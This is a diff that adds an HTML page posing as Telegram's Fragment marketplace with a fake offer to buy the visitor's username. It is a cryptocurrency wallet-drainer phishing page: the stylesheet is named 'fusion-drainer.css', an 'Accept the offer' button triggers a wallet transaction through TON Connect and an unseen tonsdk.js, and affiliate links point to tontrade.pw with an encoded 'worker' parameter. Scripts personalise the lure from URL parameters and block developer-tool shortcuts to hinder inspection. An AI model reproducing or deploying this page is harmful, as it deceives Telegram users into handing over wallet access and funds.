@@ -1,0 +1,351 @@
+<!DOCTYPE html><html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;" csaa13="csaa13"><head>
+
+  <link rel="stylesheet" href="css/fusion-drainer.css">
+  <title>Fragment</title>
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+
+<body class="emoji_image no-transition tc-using-mouse"  style="top: auto;"><
+  <link href="css/font-robotoc4ca.css" rel="stylesheet" type="text/css">
+  <link href="css/bootstrap.mineccb.css" rel="stylesheet">
+  <link href="css/bootstrap-extrac81e.css" rel="stylesheet">
+  <link href="css/auctiond09b.css" rel="stylesheet">
+
+  <svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;left:-10000px">
+    <defs>
+      <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z">
+      </path>
+      <path id="icon-ton-qr" d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z" fill="none" stroke="currentColor" stroke-width="2.1"></path>
+
+      <path d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z" id="icon-star"></path>
+      <linearGradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2">
+        <stop stop-color="#FFD951" offset="0%"></stop>
+        <stop stop-color="#FFB222" offset="100%"></stop>
+      </linearGradient>
+      <linearGradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3">
+        <stop stop-color="#E58F0D" offset="0%"></stop>
+        <stop stop-color="#EB7915" offset="100%"></stop>
+      </linearGradient>
+      <filter x="-5.2%" y="-5.3%" width="110.3%" height="110.6%" filterUnits="objectBoundingBox" id="s4">
+        <feOffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feOffset>
+        <feComposite in="shadowOffsetInner1" in2="SourceAlpha" operator="arithmetic" k2="-1" k3="1" result="shadowInnerInner1"></feComposite>
+        <feColorMatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0" type="matrix" in="shadowInnerInner1">
+        </feColorMatrix>
+      </filter>
+      <g id="icon-colorful-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+        <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+        <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+      </g>
+      <g id="icon-multi-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
+        <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+        <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+        <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+        <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor"></path>
+      </g>
+    </defs>
+  </svg>
+  <div id="aj_progress" class="progress-bar"></div>
+
+  <div id="aj_content">
+    <header class="tm-header">
+      <div class="tm-header-logo">
+        <a href="#" onclick="location.reload()" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
+          <i class="tm-logo-icon js-logo-icon"></i>
+          <i class="tm-logo-text"></i>
+        </a>
+      </div>
+      <div class="tm-header-body">
+        <form class="tm-header-search-form" style="margin-right: 10px;">
+          <div class="icon-before icon-search tm-field tm-search-field">
+            <input type="search" class="form-control tm-input tm-search-input" name="query" placeholder="Search phone numbers" autocomplete="off">
+          </div>
+        </form>
+      </div>
+      <div class="tm-header-menu js-header-menu hide aj_popup" data-close-outside="js-header-menu-window" id="n2ij53bk5b3">
+        <div class="tm-header-menu-window js-header-menu-window">
+          <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close" id="anwfabwfkj2"></div>
+          <div class="tm-header-menu-body">
+            <h4 class="tm-menu-subheader">Platform</h4>
+            <div class="tm-menu-links">
+              <a href="http://tontrade.pw/?tgWebAppStartParam=cHJpY2VfMTUwLXVzZXJuYW1lX2Zrc2Rmay13b3JrZXJfNzA0NTI5MTc1OQ%3D%3D#" class="tm-menu-link icon-before icon-menu-about">About</a>
+              <a href="http://tontrade.pw/?tgWebAppStartParam=cHJpY2VfMTUwLXVzZXJuYW1lX2Zrc2Rmay13b3JrZXJfNzA0NTI5MTc1OQ%3D%3D#" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
+              <a href="http://tontrade.pw/?tgWebAppStartParam=cHJpY2VfMTUwLXVzZXJuYW1lX2Zrc2Rmay13b3JrZXJfNzA0NTI5MTc1OQ%3D%3D#" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
+            </div>
+            <div class="tm-header-menu-footer">
+              <div class="tm-header-menu-footer-text">
+                Connect TON and Telegram <br>to view your bids and assets
+              </div>
+              <button class="btn btn-primary btn-block tm-menu-button ton-auth-link ton-connect">
+                <i class="icon icon-connect-ton"></i>
+                <span class="tm-button-label">Connect TON</span>
+              </button>
+              <button class="btn btn-default btn-block tm-menu-button login-link">
+                <i class="icon icon-connect-telegram"></i>
+                <span class="tm-button-label">Connect Telegram</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="tm-main js-main-content">
+      <section class="tm-section tm-auction-section">
+        <div class="tm-section-header">
+          <h2 class="tm-section-header-text">
+                          <span id = "dd" class="tm-section-header-domain">thezzzeroz.t.me</span>
+                        <span class="tm-section-header-status tm-status-avail">Claimed</span>
+
+          </h2>
+          <div class="tm-section-subscribe tm-section-box js-subscribe">
+            <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
+            <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
+          </div>
+        </div>
+        <div class="tm-section-box tm-section-bid-info">
+          <table class="table tm-table tm-table-fixed">
+            <thead>
+              <tr>
+                <th>What is this?</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+                      <div class="tm-bid-info-text tm-offer-info-text">
+              Someone offered <span id = "pr2" class="icon-before icon-ton">5000</span> for your username. If the price
+              suits you,
+              press "Accept the offer".
+              <a href="#" class="tm-nowrap js-howofferworks open-modal"><br>How does this work?</a>
+            </div>
+                  </div>
+
+                  <div class="tm-list tm-section-box tm-section-auction-info" bis_skin_checked="1">
+            <dl class="tm-list-item">
+              <dt class="tm-list-item-title">Telegram Username</dt>
+              <dd class="tm-list-item-value">
+            <span id="username" class="accent-color">@default_username</span>
+              </dd>
+            </dl>
+            <dl class="tm-list-item">
+              <dt class="tm-list-item-title">Web Address</dt>
+              <dd class="tm-list-item-value">
+                <span id = "usernames" class="accent-color">t.me/thezzzeroz</span>
+              </dd>
+            </dl>
+            <dl class="tm-list-item">
+              <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
+              <dd class="tm-list-item-value">
+                <span class="accent-color"><span id = "web-address" class="tm-web3-address"><span class="subdomain">thezzzeroz</span><span class="domain">.t.me</span></span></span>
+              </dd>
+            </dl>
+          </div>
+
+        <div id="tonconnect-widget"></div>
+
+
+<div class="ton-connect" style="max-width: fit-content;margin-left: auto; margin-right: auto;">
+        <div id = "ton-connect" class="tm-section-box tm-section-buttons">
+          <button  onclick="didtrans();" class="btn btn-primary js-buy-now-btn1 ">
+            <span class="tm-button-label1">Accept the offer</span>
+          </button>
+        </div>
+</div>
+
+
+
+
+      </section>
+      <section class="tm-section clearfix">
+        <div class="tm-section-header">
+          <h3 class="tm-section-header-text">Latest Offers</h3>
+        </div>
+        <div class="tm-table-wrap">
+          <table class="table tm-table tm-table-fixed">
+            <thead>
+              <tr>
+                <th style="--thin-width:100px;--wide-width:25%">Offer</th>
+                <th style="--thin-width:110px;--wide-width:25%">Date</th>
+                <th style="--width:50%">From</th>
+              </tr>
+            </thead>
+            <tfoot>
+
+            </tfoot>
+            <tbody>
+              <tr>
+                <td>
+                  <div class="table-cell">
+                    <div id ="pr1"class="table-cell-value tm-value icon-before icon-ton">5000</div>
+                  </div>
+                </td>
+                <td>
+                  <div class="table-cell">
+                    <div class="tm-datetime">
+                      <span class="wide-only">
+                        <time id="current-time">1 Jan 1970 at 01:00</time>
+						<time id="offer-date">2024-12-31 23:59:59</time>
+                      </span>
+                    </div>
+                  </div>
+                </td>
+                <td>
+                  <div class="table-cell">
+                    <a href="https://tonviewer.com/EQCOj4wEjXUR59Kq0KeXUJouY5iAcujkmwJGsYX7qPnITEAM" class="tm-wallet" target="_blank"><span class="head">EQCOj4wmwJGsYX7qPnITEAM</span><span class="middle"></span><span class="tail">MCS3-qNb6WTmn8VnTB-olNBf</span></a>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+    </main>
+    <footer class="tm-footer">
+      <div class="tm-footer-links">
+        <a href="#" class="tm-footer-link">Top Auctions</a>
+        <a href="#about" class="tm-footer-link">About</a>
+        <a href="#terms" class="tm-footer-link">Terms</a>
+        <a href="#privacy" class="tm-footer-link">Privacy</a>
+      </div>
+    </footer>
+    <div class="popup-container js-howitworks-popup aj_popup" style="display: none;">
+      <div class="popup">
+        <div class="popup-body">
+          <section>
+            <h4>How does this work?</h4>
+            <p class="popup-text">You have received an offer to sell your <b>collectible number / username</b>, follow
+              the instructions:<br> <br><b>To do so, simply:</b><br>• Get <a href="https://tonkeeper.com/">Tonkeeper</a>, open it and create a <b>wallet</b>.<br>• Deposit funds in
+              your <b>wallet</b> from a <a href="https://ton.org/buy-toncoin">supported exchange</a> or with <a href="https://wallet.t.me/">@wallet</a> on Telegram.<br>• Use <b>Tonkeeper</b> to log in on Fragment and
+              return to this page.<br>• Tap the button below to accept the offer<br><br>Upon acceptance, the username /
+              number offer will immediately take possession of the buyer.
+            </p>
+            <div class="popup-buttons">
+              <a href="#" class="btn btn-link btn-lg popup-cancel-btn close-modal">Close</a>
+            </div>
+          </section>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    // Получаем элемент с таймером
+    const countdownElement = document.getElementById('countdown-timer');
+    const offerDateElement = document.getElementById('offer-date');
+
+    // Получаем дату завершения из элемента
+    const offerEndDate = new Date(offerDateElement.textContent);
+
+    function updateCountdown() {
+      const now = new Date();
+      const timeLeft = offerEndDate - now;
+
+      if (timeLeft <= 0) {
+        countdownElement.textContent = "Offer expired";
+        return;
+      }
+
+      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+      countdownElement.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+    }
+
+    // Запускаем обратный отсчёт
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+  });
+</script>
+
+
+  <script>
+    const date = new Date(25);
+
+    const day = date.getDate();
+    const month = date.toLocaleString('en', { month: 'short' });
+    const year = date.getFullYear();
+    const hours = date.getHours().toString().padStart(2, '0');
+    const minutes = date.getMinutes().toString().padStart(2, '0');
+
+    const formattedDate = `${day} ${month} ${year} at ${hours}:${minutes}`;
+
+    document.getElementById('current-time').innerText = formattedDate;
+  </script>
+  <script>
+    document.querySelectorAll('.open-modal').forEach(button => {
+      button.addEventListener('click', () => {
+        document.querySelector('.popup-container').style.display = 'flex';
+      });
+    });
+
+    document.querySelectorAll('.close-modal').forEach(button => {
+      button.addEventListener('click', () => {
+        document.querySelector('.popup-container').style.display = 'none';
+      });
+    });
+  </script>
+
+ <script>
+        // Отключение контекстного меню
+        
+
+        // Отключение комбинаций клавиш, связанных с исходным кодом
+        document.addEventListener('keydown', function(e) {
+            // Запрет F12 (инструменты разработчика)
+            if (e.key === 'F12') {
+                e.preventDefault();
+                alert('Доступ запрещен!');
+            }
+            // Запрет Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.ctrlKey && (e.key === 'i' || e.key === 'j' || e.key === 'u')) {
+                e.preventDefault();
+                alert('Доступ запрещен!');
+            }
+        });
+    </script>
+<script>
+        // Function to get URL parameters
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get the 'username' parameter from the URL
+        const username = getQueryParam('username') || 'default_username';
+        const price = getQueryParam('price') || 'default_price';
+
+        // Update the content dynamically
+        document.getElementById('username').textContent = `@${username}`;
+        document.getElementById('usernames').textContent = `t.me/${username}`;
+        document.getElementById('web-address').textContent = `${username}.t.me`;
+        document.getElementById('dd').textContent = `${username}.t.me`;
+        document.getElementById('pr1').textContent = `${price}`;
+      document.getElementById('pr2').textContent = `${price}`;
+    </script>
+	<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '1aa8591b031dcdf4ee6b7536045c1572d46bb1be';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+<script src="tonsdk.js"></script>
+
+
+</body></html>
